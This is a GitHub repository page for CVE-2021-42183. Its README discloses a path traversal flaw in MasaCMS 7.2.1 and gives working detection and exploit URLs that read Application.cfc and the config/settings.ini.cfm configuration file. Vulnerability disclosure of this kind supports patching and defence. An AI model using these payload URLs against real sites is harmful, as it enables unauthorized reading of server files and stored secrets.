* [Insights](/0xRaw/CVE-2021-42183/pulse)

Additional navigation options

* [Code](/0xRaw/CVE-2021-42183)
* [Issues](/0xRaw/CVE-2021-42183/issues)
* [Pull requests](/0xRaw/CVE-2021-42183/pulls)
* [Actions](/0xRaw/CVE-2021-42183/actions)
* [Projects](/0xRaw/CVE-2021-42183/projects)
* [Security](/0xRaw/CVE-2021-42183/security)
* [Insights](/0xRaw/CVE-2021-42183/pulse)

# 0xRaw/CVE-2021-42183

    main[Branches](/0xRaw/CVE-2021-42183/branches)[Tags](/0xRaw/CVE-2021-42183/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[4 Commits](/0xRaw/CVE-2021-42183/commits/main/) | | |
| [README.md](/0xRaw/CVE-2021-42183/blob/main/README.md "README.md") | | [README.md](/0xRaw/CVE-2021-42183/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2021-42183

MasaCMS 7.2.1 is affected by a path traversal vulnerability in /index.cfm/\_api/asset/image/.

# Detection

```
If this file is readable it means the vulnerablilty exists.
https://example.com/index.cfm/_api/asset/image/?filePath=/Application.cfc

```

# Exploit

```
https://example.com/index.cfm/_api/asset/image/?filePath=/../<Path>
- Read The Config File
https://example.com/index.cfm/_api/asset/image/?filePath=/../config/settings.ini.cfm

```

## Tested On

MasaCMS 7.2.1

## Vendor

<http://www.masacms.com>

<https://github.com/MasaCMS/MasaCMS>
<https://github.com/MasaCMS/MasaCMS/blob/01e0636db0ea4c132906724e1b0772c86e263ada/core/mura/content/file/fileManager.cfc#L368>

## Discoverd By:

Rawi And BassamAssiri.

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/0xRaw/CVE-2021-42183/activity)
### Stars

[**0**
stars](/0xRaw/CVE-2021-42183/stargazers)
### Watchers

[**1**
watching](/0xRaw/CVE-2021-42183/watchers)
### Forks

[**0**
forks](/0xRaw/CVE-2021-42183/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xRaw%2FCVE-2021-42183&report=0xRaw+%28user%29)

## [Releases](/0xRaw/CVE-2021-42183/releases)

No releases published

## [Packages 0](/users/0xRaw/packages?repo_name=CVE-2021-42183)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


